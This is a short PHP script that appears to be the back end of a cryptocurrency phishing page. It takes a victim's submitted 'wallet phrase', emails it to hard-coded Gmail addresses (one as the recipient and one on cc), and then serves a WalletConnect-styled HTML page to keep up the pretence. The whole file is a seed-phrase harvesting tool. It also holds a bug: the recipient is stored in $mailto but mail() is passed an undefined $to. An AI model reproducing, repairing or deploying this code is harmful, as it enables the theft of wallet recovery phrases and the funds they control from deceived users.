<?php
if(isset($_POST['submit'])) {
$mailto="godwindon080@gmail.com";
$text=$_POST['text'];
$subject="phrase";
$txt="Your wallet phrase: $text";
$headers="From: dgonyedikachi@gmail.com"."\r\n". "cc:godwinprosperchiegosike@gmail.com";
}
if(mail($to,$subject,$txt,$headers)) {
	readfile("walletconnect3.html");

;}
else{
	echo "failed";}
?>															